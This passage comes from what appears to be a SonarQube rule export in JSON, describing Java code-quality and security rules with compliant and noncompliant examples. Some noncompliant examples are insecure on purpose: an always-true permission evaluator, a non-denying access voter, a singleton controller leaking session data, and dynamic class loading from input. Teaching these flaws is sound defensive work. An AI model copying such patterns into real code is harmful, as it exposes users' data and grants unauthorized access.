            "mdDesc": "<p>This rule raises an issue when an iteration over the items of a <code>Collection</code> is performed on a super-type of the type handled by the\n<code>Collection</code>.</p>\n<p>Relying on <code>Object</code> or any classes between <code>Object</code> and the real class handled by the <code>Collection</code> is not\nrecommended. While it's accepted by the language, this practice reduces readability of the code and forces to down-cast the item of the\n<code>Collection</code> to be able to call a method on it while simply using the correct type in the iteration makes things more clear and simple.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic Collection&lt;Person&gt; getPersons() { ... }\n\nfor (Object item : getPersons()) { // Noncompliant\n  Person person = (Person) item; // Noncompliant; it's required to down-cast to the to correct type to use \"item\"\n  person.getAdress();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (Person person : getPersons()) { // Compliant\n  person.getAddress() ;\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice",
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3749",
            "repo": "java",
            "name": "Members of Spring components should be injected",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Spring <code>@Component</code>, <code>@Controller</code>, <code>@Service</code>, and <code>@Repository</code> classes are singletons by default,\nmeaning only one instance of the class is ever instantiated in the application. Typically such a class might have a few <code>static</code> members,\nsuch as a logger, but all non-<code>static</code> members should be managed by Spring. That is, they should have one of these annotations:\n<code>@Resource</code>, <code>@Inject</code>, <code>@Autowired</code> or <code>@Value</code>.</p>\n<p>Having non-injected members in one of these classes could indicate an attempt to manage state. Because they are singletons, such an attempt is\nalmost guaranteed to eventually expose data from User1's session to User2. </p>\n<p>This rule raises an issue when a singleton <code>@Component</code>, <code>@Controller</code>, <code>@Service</code>, or <code>@Repository</code>,\nnot annotated with <code>@ConfigurationProperties</code>, has non-<code>static</code> members that are not annotated with one of:</p>\n<ul>\n  <li> <code>org.springframework.beans.factory.annotation.Autowired</code> </li>\n  <li> <code>org.springframework.beans.factory.annotation.Value</code> </li>\n  <li> <code>javax.annotation.Inject</code> </li>\n  <li> <code>javax.annotation.Resource</code> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Controller\npublic class HelloWorld {\n\n  private String name = null;\n\n  @RequestMapping(\"/greet\", method = GET)\n  public String greet(String greetee) {\n\n    if (greetee != null) {\n      this.name = greetee;\n    }\n\n    return \"Hello \" + this.name;  // if greetee is null, you see the previous user's data\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n</ul>",
            "mdDesc": "<p>Spring <code>@Component</code>, <code>@Controller</code>, <code>@Service</code>, and <code>@Repository</code> classes are singletons by default,\nmeaning only one instance of the class is ever instantiated in the application. Typically such a class might have a few <code>static</code> members,\nsuch as a logger, but all non-<code>static</code> members should be managed by Spring. That is, they should have one of these annotations:\n<code>@Resource</code>, <code>@Inject</code>, <code>@Autowired</code> or <code>@Value</code>.</p>\n<p>Having non-injected members in one of these classes could indicate an attempt to manage state. Because they are singletons, such an attempt is\nalmost guaranteed to eventually expose data from User1's session to User2. </p>\n<p>This rule raises an issue when a singleton <code>@Component</code>, <code>@Controller</code>, <code>@Service</code>, or <code>@Repository</code>,\nnot annotated with <code>@ConfigurationProperties</code>, has non-<code>static</code> members that are not annotated with one of:</p>\n<ul>\n  <li> <code>org.springframework.beans.factory.annotation.Autowired</code> </li>\n  <li> <code>org.springframework.beans.factory.annotation.Value</code> </li>\n  <li> <code>javax.annotation.Inject</code> </li>\n  <li> <code>javax.annotation.Resource</code> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Controller\npublic class HelloWorld {\n\n  private String name = null;\n\n  @RequestMapping(\"/greet\", method = GET)\n  public String greet(String greetee) {\n\n    if (greetee != null) {\n      this.name = greetee;\n    }\n\n    return \"Hello \" + this.name;  // if greetee is null, you see the previous user's data\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "owasp-a3",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "customInjectionAnnotations",
                    "htmlDesc": "comma-separated list of FQDN annotation names to consider as valid",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S4719",
            "repo": "java",
            "name": "\"StandardCharsets\" constants should be preferred",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>JDK7 introduced the class <code>java.nio.charset.StandardCharsets</code>. It provides constants for all charsets that are guaranteed to be\navailable on every implementation of the Java platform.</p>\n<ul>\n  <li> ISO_8859_1 </li>\n  <li> US_ASCII </li>\n  <li> UTF_16 </li>\n  <li> UTF_16BE </li>\n  <li> UTF_16LE </li>\n  <li> UTF_8 </li>\n</ul>\n<p>These constants should be preferred to:</p>\n<p>- the use of a String such as \"UTF-8\" which has the drawback of requiring the <code>catch</code>/<code>throw</code> of an\n<code>UnsupportedEncodingException</code> that will never actually happen</p>\n<p>- the use of Guava’s <code>Charsets</code> class, which has been obsolete since JDK7</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  byte[] bytes = string.getBytes(\"UTF-8\"); // Noncompliant; use a String instead of StandardCharsets.UTF_8\n} catch (UnsupportedEncodingException e) {\n  throw new AssertionError(e);\n}\n// ...\nbyte[] bytes = string.getBytes(Charsets.UTF_8); // Noncompliant; Guava way obsolete since JDK7\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nbyte[] bytes = string.getBytes(StandardCharsets.UTF_8)\n</pre>",
            "mdDesc": "<p>JDK7 introduced the class <code>java.nio.charset.StandardCharsets</code>. It provides constants for all charsets that are guaranteed to be\navailable on every implementation of the Java platform.</p>\n<ul>\n  <li> ISO_8859_1 </li>\n  <li> US_ASCII </li>\n  <li> UTF_16 </li>\n  <li> UTF_16BE </li>\n  <li> UTF_16LE </li>\n  <li> UTF_8 </li>\n</ul>\n<p>These constants should be preferred to:</p>\n<p>- the use of a String such as \"UTF-8\" which has the drawback of requiring the <code>catch</code>/<code>throw</code> of an\n<code>UnsupportedEncodingException</code> that will never actually happen</p>\n<p>- the use of Guava’s <code>Charsets</code> class, which has been obsolete since JDK7</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry {\n  byte[] bytes = string.getBytes(\"UTF-8\"); // Noncompliant; use a String instead of StandardCharsets.UTF_8\n} catch (UnsupportedEncodingException e) {\n  throw new AssertionError(e);\n}\n// ...\nbyte[] bytes = string.getBytes(Charsets.UTF_8); // Noncompliant; Guava way obsolete since JDK7\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nbyte[] bytes = string.getBytes(StandardCharsets.UTF_8)\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "java7"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5803",
            "repo": "java",
            "name": "Class members annotated with \"@VisibleForTesting\" should not be accessed from production code",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>@VisibleForTesting can be used to mark methods, fields and classes whose visibility restrictions have been relaxed more than necessary for the API\nto allow for easier unit testing.</p>\n<p>Access to such methods, fields and classes only possible thanks to this relaxed visibility is fine for test code, but it should be avoided in\nproduction code. In production code these methods should be treated as if they are private.</p>\n<p>Supported framework:</p>\n<p> * Guava: <code>com.google.common.annotations.VisibleForTesting</code></p>\n<p> * AssertJ: <code>org.assertj.core.util.VisibleForTesting</code></p>\n<p> * Android: <code>androidx.annotation.VisibleForTesting</code></p>\n<p> * Apache Flink: <code>org.apache.flink.annotation.VisibleForTesting</code></p>\n<p>or any other annotation named <code>VisibleForTesting</code></p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n/** src/main/java/MyObject.java */\n\n@VisibleForTesting String foo;\n\n/** src/main/java/Service.java */\n\nnew MyObject().foo; // Noncompliant, foo is accessed from production code\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n/** src/main/java/MyObject.java */\n\n@VisibleForTesting String foo;\n\n/** src/test/java/MyObjectTest.java */\n\nnew MyObject().foo; // Compliant, foo is accessed from test code\n</pre>",
            "mdDesc": "<p>@VisibleForTesting can be used to mark methods, fields and classes whose visibility restrictions have been relaxed more than necessary for the API\nto allow for easier unit testing.</p>\n<p>Access to such methods, fields and classes only possible thanks to this relaxed visibility is fine for test code, but it should be avoided in\nproduction code. In production code these methods should be treated as if they are private.</p>\n<p>Supported framework:</p>\n<p> * Guava: <code>com.google.common.annotations.VisibleForTesting</code></p>\n<p> * AssertJ: <code>org.assertj.core.util.VisibleForTesting</code></p>\n<p> * Android: <code>androidx.annotation.VisibleForTesting</code></p>\n<p> * Apache Flink: <code>org.apache.flink.annotation.VisibleForTesting</code></p>\n<p>or any other annotation named <code>VisibleForTesting</code></p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n/** src/main/java/MyObject.java */\n\n@VisibleForTesting String foo;\n\n/** src/main/java/Service.java */\n\nnew MyObject().foo; // Noncompliant, foo is accessed from production code\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n/** src/main/java/MyObject.java */\n\n@VisibleForTesting String foo;\n\n/** src/test/java/MyObjectTest.java */\n\nnew MyObject().foo; // Compliant, foo is accessed from test code\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5808",
            "repo": "java",
            "name": "Authorizations should be based on strong decisions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Authorizations granted or not to users to access resources of an application should be based on strong decisions. For instance, checking whether\nthe user is authenticated or not, has the right roles/privileges. It may also depend on the user's location, or the date, time when the user requests\naccess.</p>\n<h2>Noncompliant Code Example</h2>\n<p>In a Spring-security web application:</p>\n<ul>\n  <li> the <code>vote</code> method of an <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html\">AccessDecisionVoter</a> type is not compliant when it returns only an affirmative decision (<code>ACCESS_GRANTED</code>) or abstains to make a decision (<code>ACCESS_ABSTAIN</code>): </li>\n</ul>\n<pre>\npublic class WeakNightVoter implements AccessDecisionVoter {\n    @Override\n    public int vote(Authentication authentication, Object object, Collection collection) {  // Noncompliant\n\n      Calendar calendar = Calendar.getInstance();\n\n      int currentHour = calendar.get(Calendar.HOUR_OF_DAY);\n\n      if(currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {\n        return ACCESS_GRANTED; // Noncompliant\n      }\n\n      // when users connect during the night, do not make decision\n      return ACCESS_ABSTAIN; // Noncompliant\n    }\n}\n</pre>\n<ul>\n  <li> the <code>hasPermission</code> method of a <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html\">PermissionEvaluator</a> type is not compliant when it doesn't return <code>false</code>: </li>\n</ul>\n<pre>\npublic class MyPermissionEvaluator implements PermissionEvaluator {\n    @Override\n    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {\n        //Getting subject\n        Object user = authentication.getPrincipal();\n\n        if(user.getRole().equals(permission)) {\n              return true; // Noncompliant\n        }\n\n        return true;  // Noncompliant\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Spring-security web application:</p>\n<ul>\n  <li> the <code>vote</code> method of an <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html\">AccessDecisionVoter</a> type should return a negative decision (<code>ACCESS_DENIED</code>): </li>\n</ul>\n<pre>\npublic class StrongNightVoter implements AccessDecisionVoter {\n    @Override\n    public int vote(Authentication authentication, Object object, Collection collection) {\n\n      Calendar calendar = Calendar.getInstance();\n\n      int currentHour = calendar.get(Calendar.HOUR_OF_DAY);\n\n      if(currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {\n        return ACCESS_GRANTED;\n      }\n\n      // users are not allowed to connect during the night\n      return ACCESS_DENIED; // Compliant\n    }\n}\n</pre>\n<ul>\n  <li> the <code>hasPermission</code> method of a <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html\">PermissionEvaluator</a> type should return <code>false</code>: </li>\n</ul>\n<pre>\npublic class MyPermissionEvaluator implements PermissionEvaluator {\n    @Override\n    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {\n        //Getting subject\n        Object user = authentication.getPrincipal();\n\n        if(user.getRole().equals(permission)) {\n              return true;\n        }\n\n        return false; // Compliant\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Boken Access Control </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/285.html\">MITRE, CWE-285</a> - Improper Authorization </li>\n</ul>",
            "mdDesc": "<p>Authorizations granted or not to users to access resources of an application should be based on strong decisions. For instance, checking whether\nthe user is authenticated or not, has the right roles/privileges. It may also depend on the user's location, or the date, time when the user requests\naccess.</p>\n<h2>Noncompliant Code Example</h2>\n<p>In a Spring-security web application:</p>\n<ul>\n  <li> the <code>vote</code> method of an <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html\">AccessDecisionVoter</a> type is not compliant when it returns only an affirmative decision (<code>ACCESS_GRANTED</code>) or abstains to make a decision (<code>ACCESS_ABSTAIN</code>): </li>\n</ul>\n<pre>\npublic class WeakNightVoter implements AccessDecisionVoter {\n    @Override\n    public int vote(Authentication authentication, Object object, Collection collection) {  // Noncompliant\n\n      Calendar calendar = Calendar.getInstance();\n\n      int currentHour = calendar.get(Calendar.HOUR_OF_DAY);\n\n      if(currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {\n        return ACCESS_GRANTED; // Noncompliant\n      }\n\n      // when users connect during the night, do not make decision\n      return ACCESS_ABSTAIN; // Noncompliant\n    }\n}\n</pre>\n<ul>\n  <li> the <code>hasPermission</code> method of a <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html\">PermissionEvaluator</a> type is not compliant when it doesn't return <code>false</code>: </li>\n</ul>\n<pre>\npublic class MyPermissionEvaluator implements PermissionEvaluator {\n    @Override\n    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {\n        //Getting subject\n        Object user = authentication.getPrincipal();\n\n        if(user.getRole().equals(permission)) {\n              return true; // Noncompliant\n        }\n\n        return true;  // Noncompliant\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Spring-security web application:</p>\n<ul>\n  <li> the <code>vote</code> method of an <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html\">AccessDecisionVoter</a> type should return a negative decision (<code>ACCESS_DENIED</code>): </li>\n</ul>\n<pre>\npublic class StrongNightVoter implements AccessDecisionVoter {\n    @Override\n    public int vote(Authentication authentication, Object object, Collection collection) {\n\n      Calendar calendar = Calendar.getInstance();\n\n      int currentHour = calendar.get(Calendar.HOUR_OF_DAY);\n\n      if(currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {\n        return ACCESS_GRANTED;\n      }\n\n      // users are not allowed to connect during the night\n      return ACCESS_DENIED; // Compliant\n    }\n}\n</pre>\n<ul>\n  <li> the <code>hasPermission</code> method of a <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html\">PermissionEvaluator</a> type should return <code>false</code>: </li>\n</ul>\n<pre>\npublic class MyPermissionEvaluator implements PermissionEvaluator {\n    @Override\n    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {\n        //Getting subject\n        Object user = authentication.getPrincipal();\n\n        if(user.getRole().equals(permission)) {\n              return true;\n        }\n\n        return false; // Compliant\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Boken Access Control </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/285.html\">MITRE, CWE-285</a> - Improper Authorization </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a5"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1449",
            "repo": "java",
            "name": "String operations should not rely on the default system locale",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Failure to specify a locale when calling the methods <code>toLowerCase()</code>, <code>toUpperCase()</code> or <code>format()</code> on\n<code>String</code> objects means the system default encoding will be used, possibly creating problems with international characters or number\nrepresentations. For instance with the Turkish language, when converting the small letter 'i' to upper case, the result is capital letter 'I' with a\ndot over it.</p>\n<p>Case conversion without a locale may work fine in its \"home\" environment, but break in ways that are extremely difficult to diagnose for customers\nwho use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when it's time to fix them. For locale-sensitive\nstrings, the correct locale should always be used, but <code>Locale.ROOT</code> can be used for case-insensitive ones.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nmyString.toLowerCase()\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nmyString.toLowerCase(Locale.TR)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4zdGBQ\">CERT, STR02-J.</a> - Specify an appropriate locale when comparing locale-dependent data\n  </li>\n</ul>",
            "mdDesc": "<p>Failure to specify a locale when calling the methods <code>toLowerCase()</code>, <code>toUpperCase()</code> or <code>format()</code> on\n<code>String</code> objects means the system default encoding will be used, possibly creating problems with international characters or number\nrepresentations. For instance with the Turkish language, when converting the small letter 'i' to upper case, the result is capital letter 'I' with a\ndot over it.</p>\n<p>Case conversion without a locale may work fine in its \"home\" environment, but break in ways that are extremely difficult to diagnose for customers\nwho use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when it's time to fix them. For locale-sensitive\nstrings, the correct locale should always be used, but <code>Locale.ROOT</code> can be used for case-insensitive ones.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nmyString.toLowerCase()\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nmyString.toLowerCase(Locale.TR)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4zdGBQ\">CERT, STR02-J.</a> - Specify an appropriate locale when comparing locale-dependent data\n  </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "unpredictable"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3626",
            "repo": "java",
            "name": "Jump statements should not be redundant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Jump statements such as <code>return</code> and <code>continue</code> let you change the default flow of program execution, but jump statements\nthat direct the control flow to the original direction are just a waste of keystrokes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void foo() {\n  while (condition1) {\n    if (condition2) {\n      continue; // Noncompliant\n    } else {\n      doTheThing();\n    }\n  }\n  return; // Noncompliant; this is a void method\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void foo() {\n  while (condition1) {\n    if (!condition2) {\n      doTheThing();\n    }\n  }\n}\n</pre>",
            "mdDesc": "<p>Jump statements such as <code>return</code> and <code>continue</code> let you change the default flow of program execution, but jump statements\nthat direct the control flow to the original direction are just a waste of keystrokes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void foo() {\n  while (condition1) {\n    if (condition2) {\n      continue; // Noncompliant\n    } else {\n      doTheThing();\n    }\n  }\n  return; // Noncompliant; this is a void method\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void foo() {\n  while (condition1) {\n    if (!condition2) {\n      doTheThing();\n    }\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "redundant"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2658",
            "repo": "java",
            "name": "Classes should not be loaded dynamically",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Dynamically loaded classes could contain malicious code executed by a static class initializer. I.E. you wouldn't even have to instantiate or\nexplicitly invoke methods on such classes to be vulnerable to an attack.</p>\n<p>This rule raises an issue for each use of dynamic class loading.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString className = System.getProperty(\"messageClassName\");\nClass clazz = Class.forName(className);  // Noncompliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/470.html\">MITRE, CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code\n  ('Unsafe Reflection') </li>\n</ul>",
            "mdDesc": "<p>Dynamically loaded classes could contain malicious code executed by a static class initializer. I.E. you wouldn't even have to instantiate or\nexplicitly invoke methods on such classes to be vulnerable to an attack.</p>\n<p>This rule raises an issue for each use of dynamic class loading.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString className = System.getProperty(\"messageClassName\");\nClass clazz = Class.forName(className);  // Noncompliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/470.html\">MITRE, CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code\n  ('Unsafe Reflection') </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a1"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "45min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "45min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "45min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "45min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1448",
            "repo": "java",
            "name": "Classes should not have too many methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.\nAbove a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>",
            "mdDesc": "<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain.\nAbove a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "countNonpublicMethods",
                    "htmlDesc": "Whether or not to include non-public methods in the count.",
                    "defaultValue": "true",
                    "type": "BOOLEAN"
                },
                {
                    "key": "maximumMethodThreshold",
                    "htmlDesc": "The maximum number of methods authorized in a class.",
                    "defaultValue": "35",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1h",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1h",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1h",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1h",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1206",
            "repo": "java",
            "name": "\"equals(Object obj)\" and \"hashCode()\" should be overridden in pairs",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the Java Language Specification, there is a contract between <code>equals(Object)</code> and <code>hashCode()</code>:</p>\n<blockquote>\n  <p>If two objects are equal according to the <code>equals(Object)</code> method, then calling the <code>hashCode</code> method on each of the two\n  objects must produce the same integer result. </p>\n  <p>It is not required that if two objects are unequal according to the <code>equals(java.lang.Object)</code> method, then calling the\n  <code>hashCode</code> method on each of the two objects must produce distinct integer results.</p>\n  <p>However, the programmer should be aware that producing distinct integer results for unequal objects may improve the performance of\n  hashtables.</p>\n</blockquote>\n<p>In order to comply with this contract, those methods should be either both inherited, or both overridden.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {    // Noncompliant - should also override \"hashCode()\"\n\n  @Override\n  public boolean equals(Object obj) {\n    /* ... */\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {    // Compliant\n\n  @Override\n  public boolean equals(Object obj) {\n    /* ... */\n  }\n\n  @Override\n  public int hashCode() {\n    /* ... */\n  }\n\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/581.html\">MITRE, CWE-581</a> - Object Model Violation: Just One of Equals and Hashcode Defined\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7DVGBQ\">CERT, MET09-J.</a> - Classes that define an equals() method must also define a\n  hashCode() method </li>\n</ul>",
